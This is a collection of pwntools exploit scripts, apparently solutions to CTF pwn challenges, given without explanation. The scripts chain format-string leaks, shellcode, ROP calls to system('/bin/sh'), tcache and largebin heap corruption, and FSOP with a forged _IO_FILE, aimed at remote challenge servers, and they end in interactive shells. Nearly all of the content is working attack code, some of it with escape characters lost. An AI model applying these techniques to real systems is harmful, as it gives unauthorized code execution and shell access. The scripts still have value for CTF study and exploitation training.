context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6') 
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('101.200.58.4',10004)
#p = process('./pwn')

#gdb.attach(p, 'b *0x40085E')
#pause()
rl("hello,What do you want to ask?")
payload=b'%8$p'

s(payload)
stack=get_addr64()-144
pr(hex(stack))
rl(b'numbern')

shellcode=asm(shellcraft.sh())
payload=shellcode.ljust(0x88,b'x00')+p64(stack)

s(payload)

inter()
```



```
from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
#context(os='linux',arch='amd64',log_level='debug')
context(log_level='debug',arch='aarch64',os='linux')  
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
io = remote('101.200.58.4',5555)
#p = process(["qemu-aarch64","-L","/usr/aarch64-linux-gnu","-g", "1234", "./pwn"])
elf = ELF('./pwn')

def bug():
    gdb.attach(target=("localhost", 1234),
            exe=elf.path,
            gdbscript='b *$rebase(0xE40)ncnb *$rebase(0xDEC)nnnnnnnn' )
    pause()

def create(i,size):
 rl(b'Your choice:')
 sl(str(97))
 rl(b'PFdata index:')
 sl(str(i))
 rl(b'PFData size:')
 sl(str(size))
def edit(i,content):
 rl(b'Your choice:')
 sl(str(101))
 rl(b'PFdata index:')
 sl(str(i))
 rl(b'Database content:')
 s(content) 
def puts(i):
 rl(b'Your choice:')
 sl(str(115))
 rl(b'PFdata index:')
 sl(str(i))
bug()
rl(b'stderr')
pie_base=int(p.recv(11),16)-0x12128
backdoor = 0xD40+pie_base
heap=pie_base+0x12018
pr(hex(pie_base))

create(0,0x68)
edit(0,b'%12$p')
puts(0)
rl(b'Database content: ')
stack = int(p.recv(12),16)-0x38
pr(hex(stack))
payload = b'%'+ str(stack&0xFFFF).encode()+b'c%25$hn'
edit(0,payload)
puts(0)

edit(0,b'%3392c%55$hn')
puts(0)

inter()
```



```
from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6') 
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('101.200.58.4',2222)
#p = process('./pwn')

def add_chunk(i,size):
 sla(b'>',str(1))
 sla(b'Index: ',str(i))
 sla(b'Size: ',str(size))
def free_chunk(i):
 sla(b'>',str(2))
 sla(b'Index: ',str(i))
def edit_chunk(i,content):
 sla(b'>',str(3))
 sla(b'Index: ',str(i))
 sla(b'Content: ',content)
def show_chunk(i):
 sla(b'>',str(4))
 sla(b'Index: ',str(i))
add_chunk(0,0x520)
add_chunk(1,0x520)
add_chunk(2,0x510)
add_chunk(3,0x540)
add_chunk(8,0x560)
add_chunk(9,0x560)
add_chunk(10,0x560)
free_chunk(0)
add_chunk(4,0x600)
show_chunk(0)
libc_base=get_addr64()-2072816
pr(hex(libc_base))

edit_chunk(0,b'a'*0x10)
show_chunk(0)
rl(b'a'*0x10)
heap_base=u64(p.recv(3).ljust(8,b'x00'))-0x20a
pr(hex(heap_base))
free_chunk(2)
edit_chunk(0,p64(libc_base+2072816)*2+p64(heap_base+0x290)+p64(libc_base+2069424-8-0x20))
add_chunk(5,0x600)
key=(heap_base+0x1ce0)>>12
free_chunk(8)
free_chunk(9)
edit_chunk(9,p64(0x404020^key))
add_chunk(11,0x560)
add_chunk(12,0x560)
edit_chunk(12,p64(0x4010a6)*4+p64(0x4011D6))
rl(b'>')
sl(str(1))
inter()
```



```
from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('3.1.30.5',9999)
#p = process('./pwn')

def add(con):
 rl("5. exit")
 sl(str(1))
 rl("Input your skill: ")
 sl(con)
add(b'song')
add(b'jump')
add(b'rap')
add(b'NBA')
rl("5. exit")
sl(str(4))
rl("music~")
rdi=0x0000000000400c83
payload=b'a'*(0x10+8)+p64(rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x4008B6)

sl(payload)

puts_addr=get_addr64()
pr(hex(puts_addr))
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')

system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
'''
libc_base=get_addr64()-libc.sym['puts']
pr(hex(libc_base))
system,bin_sh=get_sb()
'''
rl("5. exit")
sl(str(4))
rl("music~")
payload=b'a'*(0x10+8)+p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)
sl(payload)

inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('3.1.30.8',9999)
#p = process('./pwn')

rl("Please enter your name")

payload=b'%9$p%6$p'
#bug()
s(payload)
rl(b'0x')
libc_base=int(p.recv(12),16)-libc.sym['__libc_start_main']-243
pr(hex(libc_base))
ogg=libc_base+0xe3afe
rl(b'0x')
stack=int(p.recv(12),16)-256
pr(hex(stack))
rdi=0x0000000000401363
rl("Come and try it out")
pay=p64(0x401273)+p64(0x40121b)+p64(stack-8)+p64(0x4012F9)
s(pay)
rl("Come and try it out")
s(b'a'*8)
rl("Congratulations on completing a big step")
s(p64(elf.got['exit']))

sleep(0.1)
s(p64(0x4010D0))

rl("Please enter your name")

payload=b'%9$p%6$p'
#bug()
s(payload)
rl(b'0x')
libc_base=int(p.recv(12),16)-libc.sym['__libc_start_main']-243
pr(hex(libc_base))
ogg=libc_base+0xe3afe
system,bin_sh=get_sb()
rl(b'0x')
stack=int(p.recv(12),16)-528
pr(hex(stack))
rdi=0x0000000000401363
rl("Come and try it out")
pay=p64(0x401273)+p64(0x40121B)+p64(stack-8)+p64(0x4012F9)
s(pay)

rl("Come and try it out")
s(b'a'*8)
pause()
s(p64(elf.got['printf']))
pause()
s(p64(system))
rl("Please enter your name")
sl(b'$0x00')
inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('',)
p = process('./pwn')
rl("Please enter your name")

payload=b'%9$p'
#bug()
s(payload)
rl(b'0x')
libc_base=int(p.recv(12),16)-libc.sym['__libc_start_main']-243
pr(hex(libc_base))
system,bin_sh=get_sb()

rdi=0x0000000000401363
rl("Come and try it out")

payload=b'a'*(0x10+8)+b'x1bx12x40x00x00x00'
#bug()
s(payload)
rl("Congratulations on completing a big step")
s(p64(elf.got['exit']))
#pause()
s(p64(0x4010D0))

rl("Please enter your name")

payload=b'aaa'
#bug()
s(payload)

rdi=0x0000000000401363
rl("Come and try it out")

payload=b'a'*(0x10+8)+b'x1bx12x40x00x00x00'
#bug()
s(payload)
rl("Congratulations on completing a big step")
s(p64(elf.got['printf']))
#pause()
s(p64(system))

rl("Please enter your name")
sl(b'$0x00')

inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('3.1.30.6',9999)
rdi=0x00000000004015c3
def exp():
 sleep(0.1)
 sl(str(26))
 for i in range(17):
  rl(b': ')
  sl(str(1))
 rl(b': ')
 #bug()
 sl(str(25))
 rl(b': ')
 sl(str(1))
 rl(b': ')
 sl(str(0x13))
 rl(b': ')
 sl(str(0x13))
 rl(b': ')
 sl(str(rdi))
 rl(b': ')
 sl(str(elf.got['puts']))
 rl(b': ')
 sl(str(elf.plt['puts']))

 rl(b': ')
 sl(str(0x4012C5))

 libc_base=get_addr64()-libc.sym['puts']
 pr(hex(libc_base))
 system,bin_sh=get_sb()
 pr(hex(system))
 pr(hex(bin_sh))
 rl("give me a length: ")
 #bug()
 sl(str(26))
 for i in range(17):
  rl(b': ')
  sl(str(1))
 rl(b': ')
 #bug()
 sl(str(25))
 rl(b': ')
 sl(str(1))
 rl(b': ')
 sl(str(0x13))
 rl(b': ')
 sl(str(0x13))
 rl(b': ')
 sl(str(rdi))
 rl(b': ')
 sl(p64(bin_sh))
 rl(b': ')
 sl(str(rdi+1))
 rl(b': ')
 sl(str(system))

true=1
while true:
 p = process('./pwn')
 rl("Your name: ")
 s(b'adminx00x00')

 rl("Your password: ")
 s(b'x00'*(0x10))
 buf=p.recvline()
 a=p.recv()
 print(a)
 if b'Wrong password!' in a:
  p.close()
  continue
 else:
  print(b'success')
  exp()
  break
  
  

'''
rl("Your name: ")
sl(b'adminx00')
rl("Your password: ")
s(b'a'*(0x10))

rl("give me a length: ")
#bug()
sl(str(26))
for i in range(17):
 rl(b': ')
 sl(str(1))
rl(b': ')
#bug()
sl(str(25))
rl(b': ')
sl(str(1))
rl(b': ')
sl(str(0x13))
rl(b': ')
sl(str(0x13))
rl(b': ')
sl(str(rdi))
rl(b': ')
sl(str(elf.got['puts']))
rl(b': ')
sl(str(elf.plt['puts']))

rl(b': ')
sl(str(0x4012C5))

libc_base=get_addr64()-libc.sym['puts']
pr(hex(libc_base))
system,bin_sh=get_sb()
pr(hex(system))
pr(hex(bin_sh))
rl("give me a length: ")
#bug()
sl(str(26))
for i in range(17):
 rl(b': ')
 sl(str(1))
rl(b': ')
#bug()
sl(str(25))
rl(b': ')
sl(str(1))
rl(b': ')
sl(str(0x13))
rl(b': ')
sl(str(0x13))
rl(b': ')
sl(str(rdi))
rl(b': ')
sl(p64(bin_sh))
rl(b': ')
sl(str(rdi+1))
rl(b': ')
sl(str(system))
'''

#inter()
```



```
true = 1
while true:
    try:
        p = process('./pwn')  # 启动进程
        rl("Your name: ")  # 提示输入名字
        s(b'adminx00x00')  # 发送名字

        rl("Your password: ")  # 提示输入密码
        s(b'x00' * (0x10))  # 发送密码

        buf = p.recvline()  # 接收一行数据
        a = p.recv()  # 接收更多数据
        print(a)  # 打印接收到的数据

        if b'Wrong password!' in a:  # 检查是否返回错误信息
            p.close()  # 关闭进程
            continue  # 继续下一轮循环
        else:
            print(b'success')  # 输出成功信息
            exp()  # 调用成功后的操作
            break  # 跳出循环

    except EOFError:
        print("Process ended unexpectedly.")  # 捕获进程意外结束的情况
        break  # 跳出循环
    except Exception as e:
        print(f"An error occurred: {e}")  # 捕获其他异常并打印错误信息
        p.close()  # 确保在发生错误时关闭进程
        break  # 跳出循环
```



```
from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('',)
p = process('./pwn')

def add1(size):
 rl(">> ")
 sl(str(1))
 rl("3. Gf3~")
 sl(str(1))
 rl(":")
 sl(str(size))

def add2(size):
 rl(">> ")
 sl(str(1))
 rl("3. Gf3~")
 sl(str(2))
 rl(":")
 sl(str(size))
def add3(size):
 rl(">> ")
 sl(str(1))
 rl("3. Gf3~")
 sl(str(3))
 rl(":")
 sl(str(size))
def free(i):
 rl(">> ")
 sl(str(2))
 rl(":")
 sl(str(i))
def show(i):
 rl(">> ")
 sl(str(3))
 rl(":")
 sl(str(i))
def edit(i,content):
 rl(">> ")
 sl(str(4))
 rl(":")
 sl(str(i))
 rl(":")
 s(content)

add3(0x420)#0
add1(0xa8)
add3(0x410)#2
add1(0xa0)
add3(0x450) #4
add1(0x90)
add3(0x440) #6
add1(0x90)
free(0)

show(0)
libc_base=get_addr64()-96-0x10-libc.sym['__malloc_hook']
pr(hex(libc_base))
malloc_hook,free_hook=get_hook()
system,bin_sh=get_sb()
IO_list_all=libc_base+libc.sym['_IO_list_all']
free(3)
free(1)

show(1)
a=p.recv(22)
heap_base=u64(p.recv(6).ljust(8,b'x00'))-0x7d0
pr(hex(heap_base))

add3(0x4ff)
free(2)
edit(0,p64(libc_base+2019280)*2+p64(heap_base+0xec0)+p64(IO_list_all-0x20))
add3(0x4ff)

fake_io_addr=heap_base+0x3a0 # 伪造的fake_IO结构体的地址

next_chain = 0
#fake_IO_FILE=p64(rdi)         #_flags=rdi
fake_IO_FILE =p64(0)*6
fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
fake_IO_FILE +=p64(system)#_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE +=p64(0)            #_markers
fake_IO_FILE +=p64(0)            #_chain
fake_IO_FILE +=p64(0)            #_fileno
fake_IO_FILE +=p64(0)            #_old_offset
fake_IO_FILE +=p64(0)            #_cur_column
fake_IO_FILE += p64(heap_base)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90,b'x00')
fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xb0,b'x00')
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xc8,b'x00')
fake_IO_FILE += p64(libc_base+libc.sym['_IO_wfile_jumps']+0x30)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

edit(2,fake_IO_FILE)
edit(1,b'a'*(0xa0)+b'/bin/shx00')

free(4)
add3(0x4ff)
free(6)
edit(4,p64(libc_base+43249385440)*2+p64(heap_base+0x870)+p64(heap_base-336-0x20))
add3(0x4ff)

#bug()
rl(">> ")
sl(str(5))

inter()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/8-1730684616.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/1-1730684616.webp)